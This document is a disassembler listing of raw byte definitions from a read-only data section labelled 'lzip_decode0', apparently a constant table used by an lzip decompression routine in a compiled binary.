.rodata.lzip_decode0:000000000000BA4E                 db    0
.rodata.lzip_decode0:000000000000BA4F                 db    0
.rodata.lzip_decode0:000000000000BA50                 db  62h ; b
.rodata.lzip_decode0:000000000000BA51                 db    0
.rodata.lzip_decode0:000000000000BA52                 db    0
.rodata.lzip_decode0:000000000000BA53                 db    0
.rodata.lzip_decode0:000000000000BA54                 db 0A3h
.rodata.lzip_decode0:000000000000BA55                 db    0
.rodata.lzip_decode0:000000000000BA56                 db    0
.rodata.lzip_decode0:000000000000BA57                 db    0
.rodata.lzip_decode0:000000000000BA58                 db  23h ; #
.rodata.lzip_decode0:000000000000BA59                 db    1
.rodata.lzip_decode0:000000000000BA5A                 db    0
.rodata.lzip_decode0:000000000000BA5B                 db    0
.rodata.lzip_decode0:000000000000BA5C                 db  22h ; "
.rodata.lzip_decode0:000000000000BA5D                 db    1
.rodata.lzip_decode0:000000000000BA5E                 db    0
.rodata.lzip_decode0:000000000000BA5F                 db    0
.rodata.lzip_decode0:000000000000BA60                 db 0B3h
.rodata.lzip_decode0:000000000000BA61                 db    0
.rodata.lzip_decode0:000000000000BA62                 db    0
.rodata.lzip_decode0:000000000000BA63                 db    0
.rodata.lzip_decode0:000000000000BA64                 db 0B0h
.rodata.lzip_decode0:000000000000BA65                 db    5
.rodata.lzip_decode0:000000000000BA66                 db  24h ; $
.rodata.lzip_decode0:000000000000BA67                 db    0
.rodata.lzip_decode0:000000000000BA68                 db  72h ; r
.rodata.lzip_decode0:000000000000BA69                 db    4
.rodata.lzip_decode0:000000000000BA6A                 db    0
.rodata.lzip_decode0:000000000000BA6B                 db    0
.rodata.lzip_decode0:000000000000BA6C                 db 0B1h
.rodata.lzip_decode0:000000000000BA6D                 db    5
.rodata.lzip_decode0:000000000000BA6E                 db    4
.rodata.lzip_decode0:000000000000BA6F                 db    0
.rodata.lzip_decode0:000000000000BA70                 db 0B2h
.rodata.lzip_decode0:000000000000BA71                 db    1
.rodata.lzip_decode0:000000000000BA72                 db    0
.rodata.lzip_decode0:000000000000BA73                 db    0
.rodata.lzip_decode0:000000000000BA74                 db  93h
.rodata.lzip_decode0:000000000000BA75                 db    0
.rodata.lzip_decode0:000000000000BA76                 db    0
.rodata.lzip_decode0:000000000000BA77                 db    0
.rodata.lzip_decode0:000000000000BA78                 db    4
.rodata.lzip_decode0:000000000000BA79                 db    0
.rodata.lzip_decode0:000000000000BA7A                 db  28h ; (
.rodata.lzip_decode0:000000000000BA7B                 db    0
.rodata.lzip_decode0:000000000000BA7C                 db 0F2h
.rodata.lzip_decode0:000000000000BA7D                 db    1
.rodata.lzip_decode0:000000000000BA7E                 db    0
.rodata.lzip_decode0:000000000000BA7F                 db    0
.rodata.lzip_decode0:000000000000BA80                 db  83h
.rodata.lzip_decode0:000000000000BA81                 db    0
.rodata.lzip_decode0:000000000000BA82                 db    0
.rodata.lzip_decode0:000000000000BA83                 db    0
.rodata.lzip_decode0:000000000000BA84                 db  62h ; b
.rodata.lzip_decode0:000000000000BA85                 db    0
.rodata.lzip_decode0:000000000000BA86                 db    0
.rodata.lzip_decode0:000000000000BA87                 db    0
.rodata.lzip_decode0:000000000000BA88                 db 0F3h
.rodata.lzip_decode0:000000000000BA89                 db    1
.rodata.lzip_decode0:000000000000BA8A                 db    0
.rodata.lzip_decode0:000000000000BA8B                 db    0
.rodata.lzip_decode0:000000000000BA8C                 db  82h
.rodata.lzip_decode0:000000000000BA8D                 db    1
.rodata.lzip_decode0:000000000000BA8E                 db    0
.rodata.lzip_decode0:000000000000BA8F                 db    0
.rodata.lzip_decode0:000000000000BA90                 db  73h ; s
.rodata.lzip_decode0:000000000000BA91                 db    0
.rodata.lzip_decode0:000000000000BA92                 db    0
.rodata.lzip_decode0:000000000000BA93                 db    0
.rodata.lzip_decode0:000000000000BA94                 db  92h
.rodata.lzip_decode0:000000000000BA95                 db    3
.rodata.lzip_decode0:000000000000BA96                 db    0
.rodata.lzip_decode0:000000000000BA97                 db    0
.rodata.lzip_decode0:000000000000BA98                 db 0A3h
.rodata.lzip_decode0:000000000000BA99                 db    4
.rodata.lzip_decode0:000000000000BA9A                 db    0
.rodata.lzip_decode0:000000000000BA9B                 db    0
.rodata.lzip_decode0:000000000000BA9C                 db  22h ; "
.rodata.lzip_decode0:000000000000BA9D                 db    1
.rodata.lzip_decode0:000000000000BA9E                 db    0
.rodata.lzip_decode0:000000000000BA9F                 db    0
.rodata.lzip_decode0:000000000000BAA0                 db  43h ; C
.rodata.lzip_decode0:000000000000BAA1                 db    1
.rodata.lzip_decode0:000000000000BAA2                 db    0
.rodata.lzip_decode0:000000000000BAA3                 db    0
.rodata.lzip_decode0:000000000000BAA4                 db  93h
.rodata.lzip_decode0:000000000000BAA5                 db    0
.rodata.lzip_decode0:000000000000BAA6                 db    0
.rodata.lzip_decode0:000000000000BAA7                 db    0
.rodata.lzip_decode0:000000000000BAA8                 db    2
.rodata.lzip_decode0:000000000000BAA9                 db    1
.rodata.lzip_decode0:000000000000BAAA                 db    0
.rodata.lzip_decode0:000000000000BAAB                 db    0
.rodata.lzip_decode0:000000000000BAAC                 db  52h ; R
.rodata.lzip_decode0:000000000000BAAD                 db    0
.rodata.lzip_decode0:000000000000BAAE                 db    0
.rodata.lzip_decode0:000000000000BAAF                 db    0
.rodata.lzip_decode0:000000000000BAB0                 db  83h
.rodata.lzip_decode0:000000000000BAB1                 db    1
.rodata.lzip_decode0:000000000000BAB2                 db    0
.rodata.lzip_decode0:000000000000BAB3                 db    0
.rodata.lzip_decode0:000000000000BAB4                 db 0C2h
.rodata.lzip_decode0:000000000000BAB5                 db    1
.rodata.lzip_decode0:000000000000BAB6                 db    0
.rodata.lzip_decode0:000000000000BAB7                 db    0
.rodata.lzip_decode0:000000000000BAB8                 db  73h ; s
.rodata.lzip_decode0:000000000000BAB9                 db    0
.rodata.lzip_decode0:000000000000BABA                 db    0
.rodata.lzip_decode0:000000000000BABB                 db    0
.rodata.lzip_decode0:000000000000BABC                 db  32h ; 2
.rodata.lzip_decode0:000000000000BABD                 db    0
.rodata.lzip_decode0:000000000000BABE                 db    0
.rodata.lzip_decode0:000000000000BABF                 db    0
.rodata.lzip_decode0:000000000000BAC0                 db    3
.rodata.lzip_decode0:000000000000BAC1                 db    2
.rodata.lzip_decode0:000000000000BAC2                 db    0
.rodata.lzip_decode0:000000000000BAC3                 db    0
.rodata.lzip_decode0:000000000000BAC4                 db  23h ; #
.rodata.lzip_decode0:000000000000BAC5                 db    0
.rodata.lzip_decode0:000000000000BAC6                 db    0
.rodata.lzip_decode0:000000000000BAC7                 db    0
.rodata.lzip_decode0:000000000000BAC8                 db 0B2h
.rodata.lzip_decode0:000000000000BAC9                 db    1
.rodata.lzip_decode0:000000000000BACA                 db    0
.rodata.lzip_decode0:000000000000BACB                 db    0
.rodata.lzip_decode0:000000000000BACC                 db    4
.rodata.lzip_decode0:000000000000BACD                 db    0
.rodata.lzip_decode0:000000000000BACE                 db  48h ; H
.rodata.lzip_decode0:000000000000BACF                 db    3
.rodata.lzip_decode0:000000000000BAD0                 db  12h
.rodata.lzip_decode0:000000000000BAD1                 db    0
.rodata.lzip_decode0:000000000000BAD2                 db    0
.rodata.lzip_decode0:000000000000BAD3                 db    0
.rodata.lzip_decode0:000000000000BAD4                 db  32h ; 2
.rodata.lzip_decode0:000000000000BAD5                 db    0
.rodata.lzip_decode0:000000000000BAD6                 db    0
.rodata.lzip_decode0:000000000000BAD7                 db    0
.rodata.lzip_decode0:000000000000BAD8                 db 0A2h
.rodata.lzip_decode0:000000000000BAD9                 db    0
.rodata.lzip_decode0:000000000000BADA                 db    0
.rodata.lzip_decode0:000000000000BADB                 db    0
.rodata.lzip_decode0:000000000000BADC                 db  72h ; r
.rodata.lzip_decode0:000000000000BADD                 db    0
.rodata.lzip_decode0:000000000000BADE                 db    0
.rodata.lzip_decode0:000000000000BADF                 db    0
.rodata.lzip_decode0:000000000000BAE0                 db  53h ; S
.rodata.lzip_decode0:000000000000BAE1                 db    0
.rodata.lzip_decode0:000000000000BAE2                 db    0
.rodata.lzip_decode0:000000000000BAE3                 db    0
.rodata.lzip_decode0:000000000000BAE4                 db    4
.rodata.lzip_decode0:000000000000BAE5                 db    0
.rodata.lzip_decode0:000000000000BAE6                 db  48h ; H
.rodata.lzip_decode0:000000000000BAE7                 db  0Ah
.rodata.lzip_decode0:000000000000BAE8                 db  32h ; 2
.rodata.lzip_decode0:000000000000BAE9                 db    0
.rodata.lzip_decode0:000000000000BAEA                 db    0
.rodata.lzip_decode0:000000000000BAEB                 db    0
.rodata.lzip_decode0:000000000000BAEC                 db 0D2h
.rodata.lzip_decode0:000000000000BAED                 db    0
.rodata.lzip_decode0:000000000000BAEE                 db    0
.rodata.lzip_decode0:000000000000BAEF                 db    0
.rodata.lzip_decode0:000000000000BAF0                 db  23h ; #
.rodata.lzip_decode0:000000000000BAF1                 db    0
.rodata.lzip_decode0:000000000000BAF2                 db    0
.rodata.lzip_decode0:000000000000BAF3                 db    0
.rodata.lzip_decode0:000000000000BAF4                 db  32h ; 2
.rodata.lzip_decode0:000000000000BAF5                 db    3
.rodata.lzip_decode0:000000000000BAF6                 db    0
.rodata.lzip_decode0:000000000000BAF7                 db    0
.rodata.lzip_decode0:000000000000BAF8                 db 0E2h
.rodata.lzip_decode0:000000000000BAF9                 db    0
.rodata.lzip_decode0:000000000000BAFA                 db    0
.rodata.lzip_decode0:000000000000BAFB                 db    0
.rodata.lzip_decode0:000000000000BAFC                 db    3
.rodata.lzip_decode0:000000000000BAFD                 db    1
.rodata.lzip_decode0:000000000000BAFE                 db    0
.rodata.lzip_decode0:000000000000BAFF                 db    0
.rodata.lzip_decode0:000000000000BB00                 db  63h ; c
.rodata.lzip_decode0:000000000000BB01                 db    3
.rodata.lzip_decode0:000000000000BB02                 db    0
.rodata.lzip_decode0:000000000000BB03                 db    0
.rodata.lzip_decode0:000000000000BB04                 db 0B2h
.rodata.lzip_decode0:000000000000BB05                 db    2
.rodata.lzip_decode0:000000000000BB06                 db    0
.rodata.lzip_decode0:000000000000BB07                 db    0
.rodata.lzip_decode0:000000000000BB08                 db  72h ; r
.rodata.lzip_decode0:000000000000BB09                 db    1
.rodata.lzip_decode0:000000000000BB0A                 db    0
.rodata.lzip_decode0:000000000000BB0B                 db    0
.rodata.lzip_decode0:000000000000BB0C                 db  93h
.rodata.lzip_decode0:000000000000BB0D                 db    1
.rodata.lzip_decode0:000000000000BB0E                 db    0
.rodata.lzip_decode0:000000000000BB0F                 db    0
.rodata.lzip_decode0:000000000000BB10                 db  63h ; c
.rodata.lzip_decode0:000000000000BB11                 db    2
.rodata.lzip_decode0:000000000000BB12                 db    0
.rodata.lzip_decode0:000000000000BB13                 db    0
.rodata.lzip_decode0:000000000000BB14                 db  33h ; 3
.rodata.lzip_decode0:000000000000BB15                 db    0
.rodata.lzip_decode0:000000000000BB16                 db    0
.rodata.lzip_decode0:000000000000BB17                 db    0
.rodata.lzip_decode0:000000000000BB18                 db 0A3h
.rodata.lzip_decode0:000000000000BB19                 db    0
.rodata.lzip_decode0:000000000000BB1A                 db    0
.rodata.lzip_decode0:000000000000BB1B                 db    0
.rodata.lzip_decode0:000000000000BB1C                 db  43h ; C
.rodata.lzip_decode0:000000000000BB1D                 db    0
.rodata.lzip_decode0:000000000000BB1E                 db    0
.rodata.lzip_decode0:000000000000BB1F                 db    0
.rodata.lzip_decode0:000000000000BB20                 db 0A2h
.rodata.lzip_decode0:000000000000BB21                 db    4
.rodata.lzip_decode0:000000000000BB22                 db    0
.rodata.lzip_decode0:000000000000BB23                 db    0
.rodata.lzip_decode0:000000000000BB24                 db    4
.rodata.lzip_decode0:000000000000BB25                 db    0
.rodata.lzip_decode0:000000000000BB26                 db 0D0h
.rodata.lzip_decode0:000000000000BB27                 db    7
.rodata.lzip_decode0:000000000000BB28                 db  32h ; 2
.rodata.lzip_decode0:000000000000BB29                 db    0
.rodata.lzip_decode0:000000000000BB2A                 db    0
.rodata.lzip_decode0:000000000000BB2B                 db    0
.rodata.lzip_decode0:000000000000BB2C                 db    4
.rodata.lzip_decode0:000000000000BB2D                 db    0
.rodata.lzip_decode0:000000000000BB2E                 db 0C0h
.rodata.lzip_decode0:000000000000BB2F                 db    7
.rodata.lzip_decode0:000000000000BB30                 db  32h ; 2
.rodata.lzip_decode0:000000000000BB31                 db    0
.rodata.lzip_decode0:000000000000BB32                 db    0
.rodata.lzip_decode0:000000000000BB33                 db    0
.rodata.lzip_decode0:000000000000BB34                 db 0D2h
.rodata.lzip_decode0:000000000000BB35                 db    0
.rodata.lzip_decode0:000000000000BB36                 db    0
.rodata.lzip_decode0:000000000000BB37                 db    0
.rodata.lzip_decode0:000000000000BB38                 db  33h ; 3
.rodata.lzip_decode0:000000000000BB39                 db    1
.rodata.lzip_decode0:000000000000BB3A                 db    0
.rodata.lzip_decode0:000000000000BB3B                 db    0
.rodata.lzip_decode0:000000000000BB3C                 db 0E2h
.rodata.lzip_decode0:000000000000BB3D                 db    1
.rodata.lzip_decode0:000000000000BB3E                 db    0
.rodata.lzip_decode0:000000000000BB3F                 db    0
.rodata.lzip_decode0:000000000000BB40                 db  33h ; 3
.rodata.lzip_decode0:000000000000BB41                 db    1
.rodata.lzip_decode0:000000000000BB42                 db    0
.rodata.lzip_decode0:000000000000BB43                 db    0
.rodata.lzip_decode0:000000000000BB44                 db 0C2h
.rodata.lzip_decode0:000000000000BB45                 db    0
.rodata.lzip_decode0:000000000000BB46                 db    0
.rodata.lzip_decode0:000000000000BB47                 db    0
.rodata.lzip_decode0:000000000000BB48                 db  90h
.rodata.lzip_decode0:000000000000BB49                 db    5
.rodata.lzip_decode0:000000000000BB4A                 db  1Ch
.rodata.lzip_decode0:000000000000BB4B                 db    0
.rodata.lzip_decode0:000000000000BB4C                 db  32h ; 2
.rodata.lzip_decode0:000000000000BB4D                 db    4
.rodata.lzip_decode0:000000000000BB4E                 db    0
.rodata.lzip_decode0:000000000000BB4F                 db    0
.rodata.lzip_decode0:000000000000BB50                 db    4
.rodata.lzip_decode0:000000000000BB51                 db    0
.rodata.lzip_decode0:000000000000BB52                 db  90h
.rodata.lzip_decode0:000000000000BB53                 db    5
.rodata.lzip_decode0:000000000000BB54                 db  32h ; 2
.rodata.lzip_decode0:000000000000BB55                 db    0
.rodata.lzip_decode0:000000000000BB56                 db    0
.rodata.lzip_decode0:000000000000BB57                 db    0
.rodata.lzip_decode0:000000000000BB58                 db 0D2h
.rodata.lzip_decode0:000000000000BB59                 db    0
.rodata.lzip_decode0:000000000000BB5A                 db    0
.rodata.lzip_decode0:000000000000BB5B                 db    0
.rodata.lzip_decode0:000000000000BB5C                 db  32h ; 2
.rodata.lzip_decode0:000000000000BB5D                 db    1
.rodata.lzip_decode0:000000000000BB5E                 db    0
.rodata.lzip_decode0:000000000000BB5F                 db    0
.rodata.lzip_decode0:000000000000BB60                 db  83h
.rodata.lzip_decode0:000000000000BB61                 db    2
.rodata.lzip_decode0:000000000000BB62                 db    0
.rodata.lzip_decode0:000000000000BB63                 db    0
.rodata.lzip_decode0:000000000000BB64                 db  62h ; b
.rodata.lzip_decode0:000000000000BB65                 db    5
.rodata.lzip_decode0:000000000000BB66                 db    0
.rodata.lzip_decode0:000000000000BB67                 db    0
.rodata.lzip_decode0:000000000000BB68                 db    4
.rodata.lzip_decode0:000000000000BB69                 db    0
.rodata.lzip_decode0:000000000000BB6A                 db  38h ; 8
.rodata.lzip_decode0:000000000000BB6B                 db    9
.rodata.lzip_decode0:000000000000BB6C                 db  32h ; 2
.rodata.lzip_decode0:000000000000BB6D                 db    0
.rodata.lzip_decode0:000000000000BB6E                 db    0
.rodata.lzip_decode0:000000000000BB6F                 db    0
.rodata.lzip_decode0:000000000000BB70                 db 0D2h
.rodata.lzip_decode0:000000000000BB71                 db    0
.rodata.lzip_decode0:000000000000BB72                 db    0
.rodata.lzip_decode0:000000000000BB73                 db    0
.rodata.lzip_decode0:000000000000BB74                 db 0B3h
.rodata.lzip_decode0:000000000000BB75                 db    0
.rodata.lzip_decode0:000000000000BB76                 db    0
.rodata.lzip_decode0:000000000000BB77                 db    0
.rodata.lzip_decode0:000000000000BB78                 db 0A3h
.rodata.lzip_decode0:000000000000BB79                 db    0
.rodata.lzip_decode0:000000000000BB7A                 db    0
.rodata.lzip_decode0:000000000000BB7B                 db    0
.rodata.lzip_decode0:000000000000BB7C                 db 0B2h
.rodata.lzip_decode0:000000000000BB7D                 db    1
.rodata.lzip_decode0:000000000000BB7E                 db    0
.rodata.lzip_decode0:000000000000BB7F                 db    0
.rodata.lzip_decode0:000000000000BB80                 db  32h ; 2
.rodata.lzip_decode0:000000000000BB81                 db    0
.rodata.lzip_decode0:000000000000BB82                 db    0
.rodata.lzip_decode0:000000000000BB83                 db    0
.rodata.lzip_decode0:000000000000BB84                 db 0C3h
.rodata.lzip_decode0:000000000000BB85                 db    1
.rodata.lzip_decode0:000000000000BB86                 db    0
.rodata.lzip_decode0:000000000000BB87                 db    0
.rodata.lzip_decode0:000000000000BB88                 db  52h ; R
.rodata.lzip_decode0:000000000000BB89                 db    1
.rodata.lzip_decode0:000000000000BB8A                 db    0
.rodata.lzip_decode0:000000000000BB8B                 db    0
.rodata.lzip_decode0:000000000000BB8C                 db    1
.rodata.lzip_decode0:000000000000BB8D                 db    0
.rodata.lzip_decode0:000000000000BB8E                 db  40h ; @
.rodata.lzip_decode0:000000000000BB8F                 db    0
.rodata.lzip_decode0:000000000000BB90                 db  80h
.rodata.lzip_decode0:000000000000BB91                 db    0
.rodata.lzip_decode0:000000000000BB92                 db  24h ; $
.rodata.lzip_decode0:000000000000BB93                 db    0
.rodata.lzip_decode0:000000000000BB94                 db  42h ; B
.rodata.lzip_decode0:000000000000BB95                 db    4
.rodata.lzip_decode0:000000000000BB96                 db    0
.rodata.lzip_decode0:000000000000BB97                 db    0
.rodata.lzip_decode0:000000000000BB98                 db    4
.rodata.lzip_decode0:000000000000BB99                 db    0
.rodata.lzip_decode0:000000000000BB9A                 db  20h
.rodata.lzip_decode0:000000000000BB9B                 db    0
.rodata.lzip_decode0:000000000000BB9C                 db  33h ; 3
.rodata.lzip_decode0:000000000000BB9D                 db    0
.rodata.lzip_decode0:000000000000BB9E                 db    0
.rodata.lzip_decode0:000000000000BB9F                 db    0
.rodata.lzip_decode0:000000000000BBA0                 db  62h ; b
.rodata.lzip_decode0:000000000000BBA1                 db    1
.rodata.lzip_decode0:000000000000BBA2                 db    0
.rodata.lzip_decode0:000000000000BBA3                 db    0
.rodata.lzip_decode0:000000000000BBA4                 db 0F3h
.rodata.lzip_decode0:000000000000BBA5                 db    0
.rodata.lzip_decode0:000000000000BBA6                 db    0
.rodata.lzip_decode0:000000000000BBA7                 db    0
.rodata.lzip_decode0:000000000000BBA8                 db 0C2h
.rodata.lzip_decode0:000000000000BBA9                 db    0
.rodata.lzip_decode0:000000000000BBAA                 db    0
.rodata.lzip_decode0:000000000000BBAB                 db    0
.rodata.lzip_decode0:000000000000BBAC                 db  42h ; B
.rodata.lzip_decode0:000000000000BBAD                 db    0
.rodata.lzip_decode0:000000000000BBAE                 db    0
.rodata.lzip_decode0:000000000000BBAF                 db    0
.rodata.lzip_decode0:000000000000BBB0                 db  12h
.rodata.lzip_decode0:000000000000BBB1                 db    0
.rodata.lzip_decode0:000000000000BBB2                 db    0
.rodata.lzip_decode0:000000000000BBB3                 db    0
.rodata.lzip_decode0:000000000000BBB4                 db  83h
.rodata.lzip_decode0:000000000000BBB5                 db    0
.rodata.lzip_decode0:000000000000BBB6                 db    0
.rodata.lzip_decode0:000000000000BBB7                 db    0
.rodata.lzip_decode0:000000000000BBB8                 db    3
.rodata.lzip_decode0:000000000000BBB9                 db    0
.rodata.lzip_decode0:000000000000BBBA                 db    0
.rodata.lzip_decode0:000000000000BBBB                 db    0
.rodata.lzip_decode0:000000000000BBBC                 db    3
.rodata.lzip_decode0:000000000000BBBD                 db    0
.rodata.lzip_decode0:000000000000BBBE                 db    0
.rodata.lzip_decode0:000000000000BBBF                 db    0
.rodata.lzip_decode0:000000000000BBC0                 db  22h ; "
.rodata.lzip_decode0:000000000000BBC1                 db    0
.rodata.lzip_decode0:000000000000BBC2                 db    0
.rodata.lzip_decode0:000000000000BBC3                 db    0
.rodata.lzip_decode0:000000000000BBC4                 db 0C3h
.rodata.lzip_decode0:000000000000BBC5                 db    1
.rodata.lzip_decode0:000000000000BBC6                 db    0
.rodata.lzip_decode0:000000000000BBC7                 db    0
.rodata.lzip_decode0:000000000000BBC8                 db  53h ; S
.rodata.lzip_decode0:000000000000BBC9                 db    0
.rodata.lzip_decode0:000000000000BBCA                 db    0
.rodata.lzip_decode0:000000000000BBCB                 db    0
.rodata.lzip_decode0:000000000000BBCC                 db  22h ; "
.rodata.lzip_decode0:000000000000BBCD                 db    0
.rodata.lzip_decode0:000000000000BBCE                 db    0
.rodata.lzip_decode0:000000000000BBCF                 db    0
.rodata.lzip_decode0:000000000000BBD0                 db 0D2h
.rodata.lzip_decode0:000000000000BBD1                 db    1
.rodata.lzip_decode0:000000000000BBD2                 db    0
.rodata.lzip_decode0:000000000000BBD3                 db    0
.rodata.lzip_decode0:000000000000BBD4                 db  33h ; 3
.rodata.lzip_decode0:000000000000BBD5                 db    0
.rodata.lzip_decode0:000000000000BBD6                 db    0
.rodata.lzip_decode0:000000000000BBD7                 db    0
.rodata.lzip_decode0:000000000000BBD8                 db    1
.rodata.lzip_decode0:000000000000BBD9                 db    0
.rodata.lzip_decode0:000000000000BBDA                 db  48h ; H
.rodata.lzip_decode0:000000000000BBDB                 db    0
.rodata.lzip_decode0:000000000000BBDC                 db    2
.rodata.lzip_decode0:000000000000BBDD                 db    4
.rodata.lzip_decode0:000000000000BBDE                 db    0
.rodata.lzip_decode0:000000000000BBDF                 db    0
.rodata.lzip_decode0:000000000000BBE0                 db 0C0h
.rodata.lzip_decode0:000000000000BBE1                 db    0
.rodata.lzip_decode0:000000000000BBE2                 db 0BCh
.rodata.lzip_decode0:000000000000BBE3                 db    0
.rodata.lzip_decode0:000000000000BBE4                 db    1
.rodata.lzip_decode0:000000000000BBE5                 db    0
.rodata.lzip_decode0:000000000000BBE6                 db    4
.rodata.lzip_decode0:000000000000BBE7                 db    0
.rodata.lzip_decode0:000000000000BBE8                 db    4
.rodata.lzip_decode0:000000000000BBE9                 db    0
.rodata.lzip_decode0:000000000000BBEA                 db  40h ; @
.rodata.lzip_decode0:000000000000BBEB                 db    4
.rodata.lzip_decode0:000000000000BBEC                 db  42h ; B
.rodata.lzip_decode0:000000000000BBED                 db    1
.rodata.lzip_decode0:000000000000BBEE                 db    0
.rodata.lzip_decode0:000000000000BBEF                 db    0
.rodata.lzip_decode0:000000000000BBF0                 db 0A2h
.rodata.lzip_decode0:000000000000BBF1                 db    3
.rodata.lzip_decode0:000000000000BBF2                 db    0
.rodata.lzip_decode0:000000000000BBF3                 db    0
.rodata.lzip_decode0:000000000000BBF4                 db 0B3h
.rodata.lzip_decode0:000000000000BBF5                 db    4
.rodata.lzip_decode0:000000000000BBF6                 db    0
.rodata.lzip_decode0:000000000000BBF7                 db    0
.rodata.lzip_decode0:000000000000BBF8                 db  93h
.rodata.lzip_decode0:000000000000BBF9                 db    0
.rodata.lzip_decode0:000000000000BBFA                 db    0
.rodata.lzip_decode0:000000000000BBFB                 db    0
.rodata.lzip_decode0:000000000000BBFC                 db 0C2h
.rodata.lzip_decode0:000000000000BBFD                 db    1
.rodata.lzip_decode0:000000000000BBFE                 db    0
.rodata.lzip_decode0:000000000000BBFF                 db    0
.rodata.lzip_decode0:000000000000BC00                 db  73h ; s
.rodata.lzip_decode0:000000000000BC01                 db    0
.rodata.lzip_decode0:000000000000BC02                 db    0
.rodata.lzip_decode0:000000000000BC03                 db    0
.rodata.lzip_decode0:000000000000BC04                 db  33h ; 3
.rodata.lzip_decode0:000000000000BC05                 db    1
.rodata.lzip_decode0:000000000000BC06                 db    0
.rodata.lzip_decode0:000000000000BC07                 db    0
.rodata.lzip_decode0:000000000000BC08                 db 0C2h
.rodata.lzip_decode0:000000000000BC09                 db    0
.rodata.lzip_decode0:000000000000BC0A                 db    0
.rodata.lzip_decode0:000000000000BC0B                 db    0
.rodata.lzip_decode0:000000000000BC0C                 db 0F2h
.rodata.lzip_decode0:000000000000BC0D                 db    0
.rodata.lzip_decode0:000000000000BC0E                 db    0
.rodata.lzip_decode0:000000000000BC0F                 db    0
.rodata.lzip_decode0:000000000000BC10                 db  33h ; 3
.rodata.lzip_decode0:000000000000BC11                 db    2
.rodata.lzip_decode0:000000000000BC12                 db    0
.rodata.lzip_decode0:000000000000BC13                 db    0
.rodata.lzip_decode0:000000000000BC14                 db  22h ; "
.rodata.lzip_decode0:000000000000BC15                 db    1
.rodata.lzip_decode0:000000000000BC16                 db    0
.rodata.lzip_decode0:000000000000BC17                 db    0
.rodata.lzip_decode0:000000000000BC18                 db  92h
.rodata.lzip_decode0:000000000000BC19                 db    0
.rodata.lzip_decode0:000000000000BC1A                 db    0
.rodata.lzip_decode0:000000000000BC1B                 db    0
.rodata.lzip_decode0:000000000000BC1C                 db  53h ; S
.rodata.lzip_decode0:000000000000BC1D                 db    0
.rodata.lzip_decode0:000000000000BC1E                 db    0
.rodata.lzip_decode0:000000000000BC1F                 db    0
.rodata.lzip_decode0:000000000000BC20                 db 0E3h
.rodata.lzip_decode0:000000000000BC21                 db    1
.rodata.lzip_decode0:000000000000BC22                 db    0
.rodata.lzip_decode0:000000000000BC23                 db    0
.rodata.lzip_decode0:000000000000BC24                 db  82h
.rodata.lzip_decode0:000000000000BC25                 db    0
.rodata.lzip_decode0:000000000000BC26                 db    0
.rodata.lzip_decode0:000000000000BC27                 db    0
.rodata.lzip_decode0:000000000000BC28                 db  13h
.rodata.lzip_decode0:000000000000BC29                 db    0
.rodata.lzip_decode0:000000000000BC2A                 db    0
.rodata.lzip_decode0:000000000000BC2B                 db    0
.rodata.lzip_decode0:000000000000BC2C                 db    4
.rodata.lzip_decode0:000000000000BC2D                 db    0
.rodata.lzip_decode0:000000000000BC2E                 db 0C0h
.rodata.lzip_decode0:000000000000BC2F                 db    0
.rodata.lzip_decode0:000000000000BC30                 db  12h
.rodata.lzip_decode0:000000000000BC31                 db    0
.rodata.lzip_decode0:000000000000BC32                 db    0
.rodata.lzip_decode0:000000000000BC33                 db    0
.rodata.lzip_decode0:000000000000BC34                 db  83h
.rodata.lzip_decode0:000000000000BC35                 db    0
.rodata.lzip_decode0:000000000000BC36                 db    0
.rodata.lzip_decode0:000000000000BC37                 db    0
.rodata.lzip_decode0:000000000000BC38                 db  23h ; #
.rodata.lzip_decode0:000000000000BC39                 db    0
.rodata.lzip_decode0:000000000000BC3A                 db    0
.rodata.lzip_decode0:000000000000BC3B                 db    0
.rodata.lzip_decode0:000000000000BC3C                 db  82h
.rodata.lzip_decode0:000000000000BC3D                 db    1
.rodata.lzip_decode0:000000000000BC3E                 db    0
.rodata.lzip_decode0:000000000000BC3F                 db    0
.rodata.lzip_decode0:000000000000BC40                 db  63h ; c
.rodata.lzip_decode0:000000000000BC41                 db    1
.rodata.lzip_decode0:000000000000BC42                 db    0
.rodata.lzip_decode0:000000000000BC43                 db    0
.rodata.lzip_decode0:000000000000BC44                 db  13h
.rodata.lzip_decode0:000000000000BC45                 db    0
.rodata.lzip_decode0:000000000000BC46                 db    0
.rodata.lzip_decode0:000000000000BC47                 db    0
.rodata.lzip_decode0:000000000000BC48                 db  12h
.rodata.lzip_decode0:000000000000BC49                 db    2
.rodata.lzip_decode0:000000000000BC4A                 db    0
.rodata.lzip_decode0:000000000000BC4B                 db    0
.rodata.lzip_decode0:000000000000BC4C                 db 0A3h
.rodata.lzip_decode0:000000000000BC4D                 db    1
.rodata.lzip_decode0:000000000000BC4E                 db    0
.rodata.lzip_decode0:000000000000BC4F                 db    0
.rodata.lzip_decode0:000000000000BC50                 db 0B3h
.rodata.lzip_decode0:000000000000BC51                 db    0
.rodata.lzip_decode0:000000000000BC52                 db    0
.rodata.lzip_decode0:000000000000BC53                 db    0
.rodata.lzip_decode0:000000000000BC54                 db 0B2h
.rodata.lzip_decode0:000000000000BC55                 db    1
.rodata.lzip_decode0:000000000000BC56                 db    0
.rodata.lzip_decode0:000000000000BC57                 db    0
.rodata.lzip_decode0:000000000000BC58                 db  93h
.rodata.lzip_decode0:000000000000BC59                 db    0
.rodata.lzip_decode0:000000000000BC5A                 db    0
.rodata.lzip_decode0:000000000000BC5B                 db    0
.rodata.lzip_decode0:000000000000BC5C                 db    4
.rodata.lzip_decode0:000000000000BC5D                 db    0
.rodata.lzip_decode0:000000000000BC5E                 db 0C8h
.rodata.lzip_decode0:000000000000BC5F                 db    0
.rodata.lzip_decode0:000000000000BC60                 db  12h
.rodata.lzip_decode0:000000000000BC61                 db    0
.rodata.lzip_decode0:000000000000BC62                 db    0
.rodata.lzip_decode0:000000000000BC63                 db    0
.rodata.lzip_decode0:000000000000BC64                 db  22h ; "
.rodata.lzip_decode0:000000000000BC65                 db    1
.rodata.lzip_decode0:000000000000BC66                 db    0
.rodata.lzip_decode0:000000000000BC67                 db    0
.rodata.lzip_decode0:000000000000BC68                 db  33h ; 3
.rodata.lzip_decode0:000000000000BC69                 db    0
.rodata.lzip_decode0:000000000000BC6A                 db    0
.rodata.lzip_decode0:000000000000BC6B                 db    0
.rodata.lzip_decode0:000000000000BC6C                 db 0A3h
.rodata.lzip_decode0:000000000000BC6D                 db    1
.rodata.lzip_decode0:000000000000BC6E                 db    0
.rodata.lzip_decode0:000000000000BC6F                 db    0
.rodata.lzip_decode0:000000000000BC70                 db  82h
.rodata.lzip_decode0:000000000000BC71                 db    0
